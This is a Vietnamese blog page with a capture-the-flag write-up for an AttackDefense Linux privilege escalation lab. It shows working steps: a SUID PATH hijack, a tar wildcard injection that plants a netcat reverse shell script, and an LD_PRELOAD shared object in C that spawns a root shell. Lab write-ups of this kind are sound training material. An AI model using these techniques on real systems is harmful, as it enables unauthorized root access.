@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="OverviewLink: https:&#x2F;&#x2F;attackdefense.com&#x2F;challengedetails?cid&#x3D;2021Difficulty: Medium (Để làm được thì dễ, để hiểu được thì khó :&#x2F;)Bài này yêu cầu đơn giản là leo thang đặc quyền, từ low-user đến">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[AttackDefense] Privilege Escalation: CTF [Oct 16-20]">
+<meta property="og:url" content="https://guyintheclouds.com/2021/01/26/Privilege-Escalation-CTF-Oct16-20-Attack-Defense/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="OverviewLink: https:&#x2F;&#x2F;attackdefense.com&#x2F;challengedetails?cid&#x3D;2021Difficulty: Medium (Để làm được thì dễ, để hiểu được thì khó :&#x2F;)Bài này yêu cầu đơn giản là leo thang đặc quyền, từ low-user đến">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/Privilege-Escalation-CTF-Oct16-20-Attack-Defense.png">
+<meta property="article:published_time" content="2021-01-26T10:06:32.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.525Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="attackdefense">
+<meta property="article:tag" content="medium">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/Privilege-Escalation-CTF-Oct16-20-Attack-Defense.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2021/01/26/Privilege-Escalation-CTF-Oct16-20-Attack-Defense/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2021/01/26/Privilege-Escalation-CTF-Oct16-20-Attack-Defense/","path":"2021/01/26/Privilege-Escalation-CTF-Oct16-20-Attack-Defense/","title":"[AttackDefense] Privilege Escalation: CTF [Oct 16-20]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[AttackDefense] Privilege Escalation: CTF [Oct 16-20] | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privileges-Escalation"><span class="nav-number">2.</span> <span class="nav-text">Privileges Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#student-to-teacher"><span class="nav-number">2.1.</span> <span class="nav-text">student to teacher</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PATH-Variables"><span class="nav-number">2.1.1.</span> <span class="nav-text">PATH Variables</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#teacher-to-admin"><span class="nav-number">2.2.</span> <span class="nav-text">teacher to admin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Tar-Wildcard-Injection"><span class="nav-number">2.2.1.</span> <span class="nav-text">Tar Wildcard Injection</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#admin-to-root"><span class="nav-number">2.3.</span> <span class="nav-text">admin to root</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LD-PRELOAD"><span class="nav-number">2.3.1.</span> <span class="nav-text">LD_PRELOAD</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker-escape"><span class="nav-number">2.4.</span> <span class="nav-text">Docker escape</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2021/01/26/Privilege-Escalation-CTF-Oct16-20-Attack-Defense/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[AttackDefense] Privilege Escalation: CTF [Oct 16-20] | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [AttackDefense] Privilege Escalation: CTF [Oct 16-20]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-01-26 17:06:32" itemprop="dateCreated datePublished" datetime="2021-01-26T17:06:32+07:00">2021-01-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/AttackDefense/" itemprop="url" rel="index"><span itemprop="name">AttackDefense</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>7 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/Privilege-Escalation-CTF-Oct16-20-Attack-Defense.png"></p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link: <a target="_blank" rel="noopener" href="https://attackdefense.com/challengedetails?cid=2021">https://attackdefense.com/challengedetails?cid=2021</a><br>Difficulty: Medium (Để làm được thì dễ, để hiểu được thì khó :&#x2F;)<br>Bài này yêu cầu đơn giản là leo thang đặc quyền, từ low-user đến super-user. </p>
+<span id="more"></span>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><h3 id="student-to-teacher"><a href="#student-to-teacher" class="headerlink" title="student to teacher"></a><em>student</em> to <em>teacher</em></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/bin/read-submission</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure>
+<p>Thấy một file binary lạ hoắc là read-submission. Điều tra thêm thông tin về thằng này.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ ls -al /usr/bin/read-submission</span><br><span class="line">-rwsr-xr-x 1 teacher teacher 10984 Oct 10 16:17 /usr/bin/read-submission</span><br><span class="line"></span><br><span class="line">student@attackdefense:~$ /usr/bin/read-submission</span><br><span class="line">Maths: 94</span><br><span class="line">Science: 85</span><br><span class="line">English: 67</span><br><span class="line">Economics: 88</span><br></pre></td></tr></table></figure>
+<p>File binary này của user <em>teacher</em>, và do có SUID nên user <em>student</em> có thể chạy file này với quyền của user <em>teacher</em>. Việc nó làm là hiển thị ra mấy cái điểm số kia. Tìm kiếm xem file binary này sử dụng binary nào khác không, việc này nhắm tới cách leo thang lên quyền của user <em>teacher</em> bằng PATH evn.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ strings /usr/bin/read-submission</span><br><span class="line">...</span><br><span class="line">AWAVI</span><br><span class="line">AUATL</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">read-file</span><br><span class="line">;*3$&quot;</span><br><span class="line">GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>Bằng cách vi diệu nào đó :)) có cái file binary này “read-file”.<br>Đùa đấy, ý tưởng là đang muốn leo lên quyền của user <em>teacher</em>, vậy nên sẽ cần recon thông tin của user <em>teacher</em>. Việc tìm các file thuộc sở hữu của user <em>teacher</em> biết đâu sẽ xem lại một vài thông tin hay ho?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ find / -user teacher 2&gt;/dev/null</span><br><span class="line">/usr/bin/read-submission</span><br><span class="line">/usr/bin/read-file</span><br><span class="line">/home/teacher</span><br><span class="line">/home/teacher/backup</span><br><span class="line">/home/teacher/backup/schedule</span><br><span class="line">/home/teacher/FLAG1</span><br><span class="line">/home/teacher/student-evaluation</span><br></pre></td></tr></table></figure>
+<p>Nhìn xem, <em>&#x2F;usr&#x2F;bin&#x2F;read-file</em>, và lúc này tôi bắt đầu tìm trong đống strings được dump ra từ <em>read-submission</em> những file kia, và nhận được <em>read-file</em>.<br>Không cần biết thằng <em>read-file</em> nó làm cái con mẹ gì, leo quyền cái đã…</p>
+<h4 id="PATH-Variables"><a href="#PATH-Variables" class="headerlink" title="PATH Variables"></a>PATH Variables</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ mkdir duma</span><br><span class="line">student@attackdefense:~$ cd duma</span><br><span class="line">student@attackdefense:~/duma$ echo &quot;/bin/bash&quot; &gt; read-file</span><br><span class="line">student@attackdefense:~/duma$ chmod +x read-file </span><br><span class="line">student@attackdefense:~/duma$ export PATH=.:$PATH</span><br><span class="line">student@attackdefense:~/duma$ echo $PATH</span><br><span class="line">.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">student@attackdefense:~/duma$ read-submission</span><br><span class="line">teacher@attackdefense:~/duma$ id</span><br><span class="line">uid=998(teacher) gid=999(student) groups=999(student)</span><br></pre></td></tr></table></figure>
+<p>Game dễ! hoặc là chưa đến đoạn khó :&#x2F;</p>
+<h3 id="teacher-to-admin"><a href="#teacher-to-admin" class="headerlink" title="teacher to admin"></a><em>teacher</em> to <em>admin</em></h3><p>Mục tiêu tiếp theo bây giờ là phải leo lên quyền của user <em>admin</em>. Ngó vào thư mục <em>&#x2F;home&#x2F;admin</em> xem có gì.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">teacher@attackdefense:/home$ cd admin</span><br><span class="line">teacher@attackdefense:/home/admin$ ls -al</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 1 admin admin 4096 Jan 26 10:12 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Oct 10 16:17 ..</span><br><span class="line">-r-------- 1 admin admin   33 Oct 10 16:17 FLAG2</span><br><span class="line">-rw-rw-r-- 1 admin admin  168 Jan 26 10:28 teacher.tar.gz</span><br></pre></td></tr></table></figure>
+<p>Sau mấy lần chạy lệnh <em>ls -al</em> trong vô vọng, thấy là cái file nén <em>teacher.tar.gz</em> có thời gian sửa đổi rất mới, và được cập nhật&#x2F;ghi đè liên tục trong một khoảng thời gian. Đoán là sẽ có một cái cronjob nào đang tác động lên nó.<br>Nhưng!<br>Đúng rồi, câu chuyện đẹp lúc đéo nào cũng bị ngắt bởi từ “Nhưng”. Tôi đéo thể tìm được cronjob nào tác động lên file nén kia cả :D<br>Cơ mà thấy nội dung trong file nén giống giống với nội dung bên trong thư mục <em>&#x2F;home&#x2F;teacher&#x2F;backup</em>. Thế thì thử tạo thêm file trong thư mục backup đấy xem thằng <em>admin</em> có nén luôn cái file mình tạo không nhở :D</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">teacher@attackdefense:/home/teacher/backup$ echo &quot;Bruh!&quot; &gt; Nen_file_nay_di.txt </span><br><span class="line"></span><br><span class="line">teacher@attackdefense:/home/teacher/backup$ ls -al</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 1 teacher teacher 4096 Jan 27 02:38 .</span><br><span class="line">drwxr-xr-x 1 teacher teacher 4096 Oct 10 16:17 ..</span><br><span class="line">-rw-rw-r-- 1 teacher student    6 Jan 27 02:38 Nen_file_nay_di.txt</span><br><span class="line">-rw-rw-r-- 1 teacher teacher   76 Oct 10 10:43 schedule</span><br><span class="line"></span><br><span class="line">teacher@attackdefense:/home/teacher/backup$ cd ..</span><br><span class="line"></span><br><span class="line">teacher@attackdefense:/home/teacher$ cp /home/admin/teacher.tar.gz .</span><br><span class="line"></span><br><span class="line">teacher@attackdefense:/home/teacher$ tar -zxvf teacher.tar.gz </span><br><span class="line">Nen_file_nay_di.txt</span><br><span class="line">schedule</span><br></pre></td></tr></table></figure>
+<p>Hay lắm tml, schedule của thằng user <em>admin</em> nén toàn bộ thư mục backup.</p>
+<h4 id="Tar-Wildcard-Injection"><a href="#Tar-Wildcard-Injection" class="headerlink" title="Tar Wildcard Injection"></a>Tar Wildcard Injection</h4><p>Ý tưởng là sẽ đánh vào quá trình nén file của <em>tar</em>, anh em có thể đọc thêm ở đây <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">Exploiting Wildcard for Privilege Escalation</a>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">teacher@attackdefense:/home/teacher/backup$ echo &quot;mkfifo /tmp/ahihi; nc localhost 4444 0&lt;/tmp/ahihi | /bin/sh &gt;/tmp/ahihi 2&gt;&amp;1; rm /tmp/ahihi&quot; &gt; shell.sh</span><br><span class="line">teacher@attackdefense:/home/teacher/backup$ echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="line">teacher@attackdefense:/home/teacher/backup$ echo &quot;&quot; &gt; --checkpoint=1</span><br></pre></td></tr></table></figure>
+<p>Mở một tab khác, bật netcat để listen trên port 4444 và…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">student@attackdefense:~$ nc -lnvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58494</span><br><span class="line">id</span><br><span class="line">uid=997(admin) gid=997(admin) groups=997(admin)</span><br><span class="line"></span><br><span class="line"># Upgrade PTY để thao tác terminal cho tiện hơn</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span><br><span class="line">See &quot;man sudo_root&quot; for details.</span><br><span class="line"></span><br><span class="line">admin@attackdefense:/home/teacher/backup$</span><br></pre></td></tr></table></figure>
+<h3 id="admin-to-root"><a href="#admin-to-root" class="headerlink" title="admin to root"></a><em>admin</em> to <em>root</em></h3><p>Có shell của user <em>admin</em> rồi, giờ còn leo lên <em>root</em> nữa thôi. Kiểm tra sudoer của user <em>admin</em>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">admin@attackdefense:/home/teacher/backup$ sudo -l</span><br><span class="line">Matching Defaults entries for admin on attackdefense:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User admin may run the following commands on attackdefense:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/apache2</span><br><span class="line"></span><br><span class="line">admin@attackdefense:/home/teacher/backup$ sudo apache2</span><br><span class="line">[Wed Jan 27 03:02:17.276254 2021] [core:warn] [pid 364] AH00111: Config variable $&#123;APACHE_RUN_DIR&#125; is not defined</span><br><span class="line">apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot</span><br></pre></td></tr></table></figure>
+<p>Để ý thấy có <em>apache2</em> có thể chạy với quyền sudo mà chả cần password, cơ mà, việc leo quyền với <em>apache2</em> khá căng, hơn nữa file cấu hình của <em>apache2</em> có vẻ đã được tuỳ biến chỗ nào đó khiến tôi đéo thể truy cập được vào các thành phần thông tin nhạy cảm bên trong.<br>Để ý kỹ lại một lần nữa, thấy cái dòng <em>env_keep+&#x3D;LD_PRELOAD</em> khá lạ. Google! (Vãi cả beep kết quả tìm kiếm đầu tiên hiện ra luôn ạ <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">Linux Privilege Escalation using LD_Preload</a>)</p>
+<h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><blockquote>
+<p><em>What is LD_PRELOAD?</em><br>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</p>
+</blockquote>
+<p>Lằng nhằng quá, làm theo cái đã…<br>Tạo một file shell.c với nội dung:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        setgid(<span class="number">0</span>);</span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Ok, biên dịch rồi thực thi, tận hưởng :D</p>
